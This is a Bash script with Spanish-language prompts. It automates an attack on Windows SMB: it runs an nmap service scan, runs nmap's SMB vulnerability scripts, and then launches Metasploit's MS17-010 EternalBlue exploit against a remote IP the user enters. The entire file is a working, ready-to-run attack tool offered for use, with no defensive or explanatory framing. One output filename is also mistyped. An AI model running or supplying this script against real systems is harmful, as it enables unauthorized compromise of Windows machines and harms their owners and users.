#!/bin/bash

borrar_color='\033[0m'
rojo='\033[1;31m'
cyan='\033[1;36m'

if [ $(id -u) -ne 0 ]; then
	echo -e "${rojo}Debes ser usuario root para ejecutar el script${borrar_color}"
exit

fi

test -f /usr/bin/msfconsole

if [ "$(echo $?)" == "0" ]; then
	clear
  read -p "Introduce la IP a escanear: " ip

	while true; do
  	echo -e "\n1) Enumeración del servicio SMB"
	echo "2) Verificar si el equipo es vulnerable"
	echo "3) Hacer el exploit al equipo"
	echo "4) Salir"
	read -p "Seleccione una opción: " opcion 
	case $opcion in 

  1)
    clear && echo "Escaneando..." && nmap -p 445 -A $ip > Enumeracion_SMB_$ip.tx && echo -e "${cyan}Resultado guardado con el nombre de  Enumeracion_SMB_$ip.txt${borrar_color}"
    exit
    ;;
  2)
    clear && echo "Escaneando..." && nmap --script smb-vuln* -p 445 $ip > Verificar_Vuln_port_445_$ip.txt && echo -e "${cyan}Reporte guardado con el nombre de  Verificar_Vuln_port_445_$ip.txt${borrar_color}"
    exit
    ;;
  3)
    clear
	echo "Ingresa la IP del equipo remoto: "
    read ip2

    msfconsole -q -x " use  exploit/windows/smb/ms17_010_eternalblue; set rhost $ip2; exploit;"
    exit 
    ;;

  4)
    break
    ;;
 *)
   echo -e " El dato porpocionado es incorrecto, vuelve a  introducir la opción"
   ;;
    esac
done

else
   echo -e "\n[!] No tienes intalado metasploit"
fi
